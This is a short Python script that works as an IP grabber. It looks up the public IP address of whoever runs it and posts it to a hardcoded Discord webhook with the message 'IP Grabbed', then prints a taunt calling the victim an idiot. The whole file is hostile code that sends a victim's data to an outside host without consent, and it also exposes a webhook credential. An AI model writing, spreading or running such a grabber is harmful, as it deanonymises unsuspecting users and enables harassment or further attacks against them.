import requests, gratient

webhook = "https://discord.com/api/webhooks/918038849119207475/_qWBZhMz3LWc9K18Cq_kzEJVvtkzuNYCTL1ZC66P78bL30KL2-UhlxB8ukjQd77t8wzF"
ip_adress = requests.get("https://api.ipify.org").text
requests.post(webhook, json={"content": f"> IP Grabbed: **{ip_adress}**"})
print(gratient.blue("Thanks for giving me your ip adress idiot ;) @rrwholelottared"))
input()